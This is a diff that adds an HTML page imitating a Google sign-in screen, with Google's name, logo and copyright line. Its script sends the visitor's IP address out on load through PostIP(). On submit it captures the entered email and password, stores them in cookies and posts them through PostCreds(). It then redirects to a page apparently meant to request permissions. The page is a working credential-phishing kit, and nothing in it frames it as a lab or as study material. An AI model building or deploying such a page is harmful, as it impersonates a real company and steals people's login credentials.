@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Sign in - Google account</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <script defer src="js/utils.js"></script> 
+</head>
+<body>
+    <script>
+    document.addEventListener("DOMContentLoaded", () => {
+    PostIP();
+
+    const loginForm = document.getElementById('loginForm');
+    loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        setCookie("email", email, 7);
+        setCookie("password", password, 7);
+
+        await PostCreds(email, password);
+        window.location.href = "AcceptPermissionRequest.html";
+    });
+    });
+    </script>
+    <div class="login-container">
+        <div class="logo">
+            <img src="images/Google_Logo.png" alt="Google Logo" />
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required />
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required />
+            </div>
+            <button type="submit" class="login-button">Sign in</button>
+                <div class="footer">
+        <p>© Google 2025. All rights reserved.</p>
+    </div>
+        </form>
+    </div>
+</body>
+</html>
+
